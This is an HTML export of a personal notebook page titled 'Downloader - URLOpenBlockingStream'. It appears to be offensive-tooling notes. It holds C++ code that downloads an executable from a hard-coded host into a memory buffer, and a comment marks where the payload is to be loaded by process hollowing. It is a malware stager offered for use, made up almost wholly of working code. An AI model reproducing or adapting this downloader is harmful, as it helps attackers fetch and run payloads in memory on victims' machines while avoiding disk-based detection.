<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>UrlOpenBlockingStream</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Downloader - URLOpenBlockingStream</h1></strong><br />• <a href="https://stackoverflow.com/questions/44027725/urldownloadtofile-to-memory">https://stackoverflow.com/questions/44027725/urldownloadtofile-to-memory</a><br />• <a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775127(v=vs.85)?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775127(v=vs.85)?redirectedfrom=MSDN</a><br /><br />Short.<br />I don&#39;t know why I haven&#39;t seen many people use this.<br />File has to be c++ because working with streams.<br /><br /><strong><h2>## Example</h2></strong><br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br />#include&nbsp;&lt;Urlmon.h&gt;<br /><br />#pragma&nbsp;comment(lib,&nbsp;&quot;urlmon.lib&quot;)<br /><br />int&nbsp;main()<br /><span style="color:#000000;font-weight:400">{</span><br />	//&nbsp;open&nbsp;URL<br />	//wchar_t&nbsp;url[]&nbsp;=&nbsp;L&quot;https://icanhazip.com&quot;;<br />	wchar_t&nbsp;url[]&nbsp;=&nbsp;L&quot;http://192.168.58.142/whoami.exe&quot;;<br />	IStream*&nbsp;pStream;<br />	HRESULT&nbsp;hResult&nbsp;=&nbsp;URLOpenBlockingStreamW(NULL,&nbsp;url,&nbsp;&amp;pStream,&nbsp;0,&nbsp;NULL);<br />	if&nbsp;(hResult&nbsp;!=&nbsp;S_OK)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[-]&nbsp;failed&nbsp;to&nbsp;open&nbsp;URL\n&quot;);<br />		return&nbsp;1;<br />	}<br /><br />	//&nbsp;download&nbsp;file<br />	char&nbsp;dl_buffer[66560];		//&nbsp;on&nbsp;debug&nbsp;build&nbsp;will&nbsp;see&nbsp;&quot;╠╠&quot;.&nbsp;on&nbsp;release,&nbsp;string&nbsp;will&nbsp;be&nbsp;truncated.&nbsp;best&nbsp;to&nbsp;insert&nbsp;actual&nbsp;file&nbsp;size&nbsp;here&nbsp;(use&nbsp;virtual&nbsp;size,&nbsp;not&nbsp;size&nbsp;on&nbsp;disk)<br />	DWORD&nbsp;dwBytesRead&nbsp;=&nbsp;0;<br />	hResult&nbsp;=&nbsp;pStream-&gt;Read(dl_buffer,&nbsp;sizeof(dl_buffer),&nbsp;&amp;dwBytesRead);<br />	if&nbsp;(hResult&nbsp;!=&nbsp;S_OK)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[-]&nbsp;failed&nbsp;to&nbsp;download&nbsp;data&nbsp;\n&quot;);<br />		return&nbsp;1;<br />	}<br /><br />	printf(&quot;bytes&nbsp;read:&nbsp;%d&nbsp;\n&quot;,&nbsp;dwBytesRead);<br />	<br />	pStream-&gt;Release();<br /><br />	//&nbsp;LOAD&nbsp;FILE&nbsp;HERE&nbsp;(process&nbsp;hollowing,&nbsp;etc.)<br />	//&nbsp;blah<br />	//&nbsp;blah<br />	//&nbsp;blah<br /><br />	//&nbsp;Included&nbsp;as&nbsp;proof&nbsp;that&nbsp;this&nbsp;works.&nbsp;Code&nbsp;below&nbsp;writes&nbsp;downloaded&nbsp;buffer&nbsp;out&nbsp;to&nbsp;file<br />	/*<br />	HANDLE&nbsp;hFile&nbsp;=&nbsp;CreateFileW(L&quot;whoami.exe&quot;,&nbsp;GENERIC_READ&nbsp;|&nbsp;GENERIC_WRITE,&nbsp;0,&nbsp;NULL,&nbsp;CREATE_ALWAYS,&nbsp;FILE_ATTRIBUTE_NORMAL,&nbsp;NULL);<br />	WriteFile(hFile,&nbsp;&amp;dl_buffer,&nbsp;dwBytesRead,&nbsp;NULL,&nbsp;NULL);<br />	CloseHandle(hFile);<br />	*/<br /><br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /></div>
</body>
</html>
